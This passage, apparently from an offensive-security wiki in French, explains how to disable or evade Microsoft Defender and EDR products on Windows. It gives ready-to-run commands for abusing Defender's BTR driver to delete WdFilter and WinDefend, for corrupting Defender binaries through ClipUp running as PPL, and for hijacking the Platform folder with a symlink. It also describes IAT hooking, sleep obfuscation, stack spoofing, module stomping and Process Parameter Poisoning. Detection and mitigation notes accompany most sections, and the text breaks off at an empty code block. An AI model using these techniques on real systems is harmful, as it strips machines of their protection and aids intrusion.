Defender dépose normalement la ressource sous la forme d’un fichier aléatoire `[a-z]{8}.sys` et enregistre un service noyau portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre l’ADS NTFS référencé, déchiffre et valide la liste d’actions, écrit les informations de retour, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après l’exécution réussie afin que le pilote se décharge au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Le flux `:changelist` contient un blob chiffré avec RC4. Les builds analysés réutilisent une clé fixe de 256 octets ; le chiffrement ne constitue donc pas une frontière d’autorisation. Un plaintext valide comporte un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC de l’en-tête et ID de transaction dérivé de la charge utile), suivi d’un chemin de feedback en UTF-16 terminé par un caractère nul et d’un nombre quelconque d’éléments. Chaque élément comprend un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ainsi que des données propres à l’action, terminées par **exactement quatre octets NUL**. Chaque région d’en-tête/de données est vérifiée séparément avec le polynôme CRC-32 `0xEDB88320`, un état initial de `0xFFFFFFFF` et **sans XOR final** (`~CRC32`) ; l’état du CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les ID d’action acceptés exposent ces primitives du noyau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Supprimer un fichier, y compris un fichier verrouillé |
| 2 | `[UTF-16 path]` | Supprimer un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplacer un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide signifie supprimer |
| 4 | `[Flags][key path]` | Supprimer récursivement une clé de registre |
| 5 | `[Flags][key path + "\\" + value]` | Supprimer une valeur de registre |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Créer/mettre à jour une valeur de registre et créer les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le flux contient **deux barres obliques inverses consécutives** ; un chemin formaté de manière conventionnelle ne sera pas correctement séparé. Le fichier de feedback reprend essentiellement la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` résultant. Pour les actions 1 et 2, qui n’ont pas de champ d’indicateurs en tête, BTR décale le chemin dans les quatre octets réservés de fin afin de faire de la place pour ce statut.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implémente la chaîne complète : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser/vérifier par checksum/chiffrer des actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` avec `-trigger now`, ou laisser le pilote se charger au démarrage avec `-trigger boot`. La configuration directe du registre évite le chemin normal du SCM `CreateServiceW` et ne génère donc **pas** l’événement d’installation de service ID 7045. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur les fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` soient prêts. `Start=1` avec le groupe prioritaire `Boot Bus Extender` permet au contraire une exécution en Phase 1 : NTFS est utilisable, mais de nombreux pilotes de sécurité à démarrage système et services EDR en mode utilisateur ne sont pas encore initialisés. Les filtres à démarrage système tels que `WdFilter` peuvent déjà être chargés, mais BTR peut supprimer leurs binaires ou leur configuration de service avant le démarrage suivant, et supprimer les exécutables des services avant que SCM ne les lance. ELAM ne comble pas cette lacune, car BTR s’exécute après l’évaluation des pilotes de démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions sont exécutées dans une même transaction. La PoC place l’Action 1 en tête pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis traite sa propre demande de suppression et l’efface avant de se décharger. Cela réduit les éléments de preuve, tandis que le fait de placer les retours dans `<random>.sys:<random>.dat` permet de supprimer le pilote et les deux flux ensemble.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à fort signal

Les règles fondées uniquement sur les signatures et la liste de blocage des pilotes vulnérables de Microsoft ne couvrent pas l’abus des fonctionnalités prévues de BTR. Privilégiez les corrélations comportementales suivantes, en distinguant la chaîne de processus légitime de Defender d’un lanceur quelconque.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est systématique lors du staging de BTR. Un ADS `.dat` associé au même `.sys` est particulièrement suspect, car Defender légitime place normalement les retours dans `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenant `Args=...:changelist` et `Group=Boot Bus Extender` à l’absence d’événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un pilote BTR connu, provenant d’une chaîne de processus autre que Defender, à la suppression ultérieure de fichiers attribuée à `System`/PID 4, en particulier s’il s’agit de binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte en cas de création et de suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Limitez et auditez l’attribution/l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft ne suffit pas à garantir la confiance lorsqu’un pilote d’outil de sécurité est mis en staging par `cmd.exe`, PowerShell ou un processus inconnu.

## Abuser de Protected Process Light (PPL) pour altérer un antivirus/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de niveaux et de signataires afin que seuls les processus protégés de niveau égal ou supérieur puissent altérer d’autres processus protégés. Du point de vue offensif, si vous pouvez lancer légitimement un binaire prenant en charge PPL et contrôler ses arguments, vous pouvez détourner une fonctionnalité bénigne (par exemple, la journalisation) pour en faire une primitive d’écriture contrainte, protégée par PPL, dans les répertoires protégés utilisés par les antivirus/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- L’EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible avec PPL.
- Le processus doit être créé avec CreateProcess à l’aide des indicateurs : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible correspondant au signataire du binaire doit être demandé (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires antimalware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Un niveau incorrect fera échouer la création.

Voir aussi cette introduction plus générale à PP/PPL et à la protection de LSASS :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil d’assistance open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Exemple d’utilisation :

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier journal dans un chemin spécifié par l’appelant.
- Lorsqu’il est lancé en tant que processus PPL, l’écriture du fichier s’effectue avec les protections PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez les chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

Utilitaires pour les chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d’exploitation (résumé)
1) Lancez le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un lanceur (par ex. CreateProcessAsPPL).
2) Passez l’argument de chemin du journal de ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par ex. Defender Platform). Utilisez les noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l’AV lorsqu’il est en cours d’exécution (par ex. MsMpEng.exe), planifiez l’écriture au démarrage avant le lancement de l’AV en installant un service à démarrage automatique qui s’exécute de façon fiable plus tôt. Vérifiez l’ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au redémarrage, l’écriture protégée par PPL se produit avant que l’AV ne verrouille ses binaires, corrompant le fichier cible et empêchant son démarrage.

Exemple d’invocation (chemins masqués/raccourcis pour des raisons de sécurité) :

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, seulement son emplacement ; cette primitive convient à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite des privilèges d’administrateur local/SYSTEM pour installer/démarrer un service, ainsi qu’une fenêtre de redémarrage.
- Le timing est crucial : la cible ne doit pas être ouverte ; l’exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsqu’il est lancé par des lanceurs non standard au démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Recherchez les créations/modifications de services précédant les échecs de démarrage de Defender.
- Surveillance de l’intégrité des fichiers des binaires/répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus avec des indicateurs de processus protégé.
- Télémétrie ETW/EDR : recherchez les processus créés avec `CREATE_PROTECTED_PROCESS` et l’utilisation anormale de niveaux PPL par des binaires non liés à l’AV.

Mesures d’atténuation
- WDAC/Code Integrity : limitez les binaires signés autorisés à s’exécuter en tant que PPL et les processus parents autorisés ; bloquez l’invocation de ClipUp hors des contextes légitimes.
- Hygiène des services : limitez la création/modification des services à démarrage automatique et surveillez la manipulation de leur ordre de démarrage.
- Assurez-vous que la protection contre les falsifications de Defender et les protections au démarrage anticipé sont activées ; examinez les erreurs de démarrage indiquant une corruption de binaire.
- Envisagez de désactiver la génération des noms courts 8.3 sur les volumes hébergeant les outils de sécurité, si cela est compatible avec votre environnement (testez soigneusement).

## Falsification de Microsoft Defender via le détournement d’un lien symbolique du dossier Platform

Windows Defender choisit la plateforme depuis laquelle il s’exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée selon l’ordre lexicographique (par exemple, `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/du registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points de réanalyse de répertoire (liens symboliques). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin contrôlé par un attaquant et provoquer le chargement latéral de DLL ou perturber le service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/liens symboliques dans le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de plateforme par Defender (redémarrage du service au démarrage)
- Outils intégrés uniquement requis (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée selon l’ordre lexicographique sans vérifier que la cible pointe vers un chemin protégé/de confiance.

Étape par étape (exemple)
1) Préparez un clone modifiable du dossier de plateforme actuel, par exemple `C:\TMP\AV` :
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez dans Platform un lien symbolique de répertoire portant un numéro de version supérieur et pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du trigger (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` ainsi que la configuration du service et le registre reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/code execution : Déposez/remplacez des DLL chargées par Defender depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt du service/déni de service : Supprimez le version-symlink pour qu’au prochain démarrage le chemin configuré ne soit plus résolu et que Defender ne puisse pas démarrer :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Notez que cette technique ne permet pas à elle seule d’élever les privilèges ; elle nécessite des droits d’administrateur.

## API/IAT Hooking + Call-Stack Spoofing avec PIC (style Crystal Kit)

Les équipes red team peuvent déplacer l’évasion à l’exécution hors de l’implant C2 et dans le module cible lui-même en hookant sa Import Address Table (IAT) et en redirigeant certaines API vers du code position-independent (PIC) contrôlé par l’attaquant. Cette approche généralise l’évasion au-delà de la petite surface d’API exposée par de nombreux kits (par exemple, CreateProcessA) et étend les mêmes protections aux BOF et aux DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Charger un blob PIC à côté du module cible à l’aide d’un chargeur réflexif (préfixé ou compagnon). Le PIC doit être autonome et indépendant de sa position.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et modifier les entrées de l’IAT des imports ciblés (par exemple, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour les faire pointer vers de minces wrappers PIC.
- Chaque wrapper PIC exécute les techniques d’évasion avant d’appeler l’API réelle en tail-call. Les techniques d’évasion courantes incluent :
  - Masquer/démasquer la mémoire autour de l’appel (par exemple, chiffrer les régions beacon, passer de RWX à RX, modifier les noms/permissions des pages), puis restaurer l’état après l’appel.
  - Call-stack spoofing : construire une pile bénigne et effectuer la transition vers l’API cible afin que l’analyse de la call stack résolve les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface permettant à un script Aggressor (ou équivalent) d’enregistrer les API à hooker pour Beacon, les BOF et les DLL de post-exploitation.

Pourquoi utiliser l’IAT hooking ici
- Fonctionne pour tout code utilisant l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour servir de proxy à des API spécifiques.
- Couvre les DLL de post-exploitation : hooker LoadLibrary* permet d’intercepter le chargement des modules (par exemple, System.Management.Automation.dll, clr.dll) et d’appliquer les mêmes techniques de masquage/d’évasion de la pile à leurs appels d’API.
- Rétablit une utilisation fiable des commandes de post-exploitation qui créent des processus face aux détections basées sur la call stack, en wrappant CreateProcessA/W.

Exemple minimal de hook IAT (pseudocode x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l’import. Les loaders réfléchis comme TitanLdr/AceLdr illustrent le hooking pendant le DllMain du module chargé.
- Gardez les wrappers très compacts et compatibles PIC ; résolvez la véritable API à l’aide de la valeur IAT d’origine capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages en écriture + exécution.

Stub de call-stack spoofing
- Les stubs PIC de type Draugr construisent une fausse chaîne d’appels (adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela déjoue les détections qui s’attendent à trouver des stacks canoniques provenant de Beacon/BOFs lors de l’appel d’API sensibles.
- Associez cette technique à des techniques de stack cutting/stack stitching pour arriver dans les frames attendues avant le prologue de l’API.

Intégration opérationnelle
- Ajoutez le loader réfléchi au début des DLL post-ex afin que le PIC et les hooks s’initialisent automatiquement au chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les API cibles afin que Beacon et les BOFs bénéficient en toute transparence de la même voie d’évasion, sans modification du code.

Considérations de détection/DFIR
- Intégrité de l’IAT : entrées pointant vers des adresses hors image (heap/anonymes) ; vérification périodique des pointeurs d’import.
- Anomalies de stack : adresses de retour n’appartenant pas aux images chargées ; transitions soudaines vers du PIC hors image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures dans l’IAT depuis le processus ; activité précoce de DllMain modifiant les thunks d’import ; régions RX inattendues créées au chargement.
- Évasion du chargement d’images : en cas de hooking de LoadLibrary*, surveillez les chargements suspects d’assemblies automation/clr corrélés à des événements de masquage mémoire.

Éléments de base et exemples associés
- Loaders réfléchis qui effectuent le patching de l’IAT au chargement (p. ex., TitanLdr, AceLdr)
- Hooks de masquage mémoire (p. ex., simplehook) et PIC de stack cutting (stackcutting)
- Stubs PIC de call-stack spoofing (p. ex., Draugr)


## Hooking de l’IAT au chargement + obfuscation du sommeil (Crystal Palace/PICO)

### Hooks IAT au chargement via un PICO résident

Si vous contrôlez un loader réfléchi, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un resolver personnalisé qui vérifie d’abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Créez un **PICO résident** (objet PIC persistant) qui reste actif après que le PIC transitoire du loader s’est libéré.
- Exportez une fonction `setup_hooks()` qui remplace le resolver d’imports du loader (p. ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hooks basée sur le hachage, comme `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon, déléguez au véritable `GetProcAddress`.
- Enregistrez les cibles des hooks au moment de l’édition des liens avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide puisqu’il se trouve dans le PICO résident.

Cela permet la **redirection de l’IAT au chargement** sans patcher la section de code de la DLL chargée après son chargement.

### Forcer les imports hookables lorsque la cible utilise le parcours du PEB

Les hooks au chargement ne se déclenchent que si la fonction figure réellement dans l’IAT de la cible. Si un module résout les API via un parcours du PEB + hachage (sans entrée d’import), forcez un véritable import afin que le chemin `ProcessImports()` du loader le détecte :

- Remplacez la résolution d’exports par hachage (p. ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur génère une entrée IAT, permettant l’interception lorsque le loader réfléchi résout les imports.

### Obfuscation du sommeil/de l’inactivité de type Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, hookez les **primitives d’attente/IPC réellement utilisées** par l’implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les longues attentes, encapsulez l’appel dans une chaîne d’obfuscation de type Ekko qui chiffre l’image en mémoire pendant l’inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` conçues à cet effet.
- Chaîne typique (x64) : passer l’image en `PAGE_READWRITE` → chiffrer avec RC4 via `advapi32!SystemFunction032` sur toute l’image mappée → effectuer l’attente bloquante → déchiffrer avec RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour appeler chaque étape.

Détail opérationnel : renvoyez « success » pour les longues attentes (p. ex., `WAIT_OBJECT_0`) afin que l’appelant poursuive son exécution pendant que l’image est masquée. Ce modèle dissimule le module aux scanners pendant les périodes d’inactivité et évite la signature classique du `Sleep()` patché.

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands buffers contigus de la taille d’une image.
- `VirtualProtect` appliqué à une grande plage, puis restauration personnalisée des permissions par section.

### Enregistrement CFG à l’exécution pour les gadgets d’obfuscation du sommeil

Sur les cibles avec CFG activé, le premier saut indirect vers un gadget au milieu d’une fonction, tel que `jmp [rbx]` ou `jmp rdi`, provoque généralement un crash du processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget ne figure pas dans les métadonnées CFG du module. Pour que les chaînes de type Ekko/Kraken fonctionnent dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses dans des images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l’image** et couvrir sa **taille complète**.
- Pour les régions mappées manuellement/PIC/stompées, utilisez plutôt la **base de l’allocation** et sa taille.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les appels système d’attente/événement) et toutes les sections exécutables contrôlées par l’attaquant qui deviendront des cibles indirectes.

Cela transforme les chaînes de sommeil de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en primitives réutilisables pour `explorer.exe`, les navigateurs, `svchost.exe` et d’autres points de terminaison compilés avec `/guard:cf`.

### Spoofing de stack compatible CET pour les threads en attente

Le remplacement complet de `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` falsifié doit toujours correspondre à la shadow stack matérielle. Une méthode plus sûre de masquage pendant le sommeil consiste à :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de stack de son `NT_TIB`/TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en attente avec `GetThreadContext`.
- Copier **uniquement** le véritable `Rip` dans le contexte falsifié, en laissant le `Rsp`/l’état de stack falsifiés intacts.
- Pendant la période de sommeil, copier le `NT_TIB` du thread falsifié dans le TEB courant afin que les stack walkers déroulent la stack dans une plage légitime.
- Une fois l’attente terminée, restaurer le TIB d’origine et le contexte du thread.

Cette méthode conserve un pointeur d’instruction compatible CET tout en induisant en erreur les stack walkers EDR qui se fient aux métadonnées de stack du TEB pour valider le déroulement.

### Alternative basée sur les APC : Kraken Mask

Si le dispatch par timer-queue est trop caractéristique, la même séquence sommeil-chiffrement-spoofing-restauration peut être exécutée par un thread auxiliaire suspendu à l’aide d’APC en attente :<sup>[[27]](#references)</sup>

- Créez un thread auxiliaire dont le point d’entrée est `NtTestAlert`.
- Mettez en file les frames `CONTEXT`/APC préparés avec `NtQueueApcThread` et exécutez-les avec `NtAlertResumeThread`.
- Stockez l’état de la chaîne sur le heap plutôt que sur la stack auxiliaire afin d’éviter d’épuiser la stack de thread par défaut de 64 Ko.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l’événement de démarrage et bloquer.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de course pendant laquelle un scanner pourrait détecter une stack partiellement restaurée.

Cette méthode remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature thread auxiliaire/APC, tout en conservant les mêmes objectifs de masquage RC4 et de stack spoofing.

Autres idées de détection
- `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` juste avant les phases de sommeil, les attentes ou le dispatch d’APC.
- `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` suivi d’écritures directes dans les limites de stack du TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des helpers de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes comme `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Stomping précis de modules

Le module stomping exécute des payloads depuis la **section `.text` d’une DLL déjà mappée dans le processus cible**, au lieu d’allouer une mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrifiable. La cible d’écrasement doit être une **image chargée et adossée au disque**, dont l’espace de code peut accueillir le payload sans corrompre les chemins de code encore nécessaires au processus.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

Le stomping naïf de modules courants tels que `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite fera planter le processus. Une méthode plus fiable consiste à :

1. Énumérer les modules du processus cible et conserver une **liste d’inclusion composée uniquement de noms** de DLL déjà chargées.
2. Créer d’abord le payload et noter sa **taille exacte en octets**.
3. Analyser les DLL candidates sur disque et comparer la **`Misc_VirtualSize` de la section PE `.text`** à la taille du payload. C’est plus important que la taille du fichier, car cette valeur correspond à la taille de la section exécutable **une fois mappée en mémoire**.
4. Analyser l’**Export Address Table (EAT)** et choisir le RVA d’une fonction exportée comme offset de départ du stomping.
5. Calculer le **rayon d’impact** : si le payload dépasse les limites de la fonction sélectionnée, il écrasera les exports adjacents disposés après celle-ci en mémoire.

Outils d’analyse/de sélection typiques observés dans la nature :

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Préférez les DLLs **déjà chargées** dans le processus distant afin d’éviter la télémétrie de `LoadLibrary`/des chargements d’images inattendus.
- Préférez les exports rarement exécutés par l’application cible, sinon les chemins de code normaux peuvent atteindre les octets modifiés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode sous forme de littéral de chaîne par un **initialiseur de tableau d’octets/entre accolades**, afin que le buffer complet soit correctement représenté dans le code source de l’injecteur.

Idées de détection
- Écritures distantes dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`), plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’exports dont les octets en mémoire ne correspondent plus au fichier de référence sur disque.
- Threads distants ou pivots de contexte qui commencent leur exécution dans un export légitime de DLL dont les premiers octets ont été récemment modifiés.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` visant des pages `.text` de DLL, suivies de la création d’un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) est une technique de **process-injection / d’évasion EDR** qui évite le chemin d’écriture distante classique (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Supports exploitables copiés par `CreateProcessW`

Les supports utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques liées aux supports :

- `lpCommandLine` doit pointer vers une **mémoire inscriptible** pour `CreateProcessW`, et sa longueur est limitée à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NOM=VALEUR\0`, terminées par un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mappage vers `ShellInfo` doit donc être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

La création normale d’un processus devient ainsi la **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie interprocessus.

### Flux de résolution distante sans API d’écriture distante

Après la création de l’enfant, résolvez le buffer copié à l’aide de primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flux minimal :

```c
